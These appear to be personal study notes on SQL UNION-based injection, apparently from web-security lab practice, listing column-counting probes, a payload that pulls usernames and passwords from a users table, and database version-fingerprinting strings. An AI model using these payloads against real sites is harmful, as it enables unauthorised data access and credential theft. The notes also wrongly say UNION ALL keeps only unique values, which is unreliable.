Union keyword lets you execute one or more select querys and append the results to original 

select a,b from table1 union select c,d from table2;

union all - just takes the unique values form the given tables

the individual queries must reutrn the same number of columns
the data types in each column must be compatible between the individual queries.

find the number of columns used using

'order by 1--  (increment it one by one till its error)

or

'union select 1--


find the column that returns string

=gifts'union select null,'yUgjGK',null--

' union select username, password from users--

examining the database:

MSSQL, mysql - select @@version;
Oracle	     - select * from v$version;
PostgreSql   - select version();

oracle banner info
' union SELECT banner,null FROM v$version--

mysql, mssql
' union select @@version,null;-- -

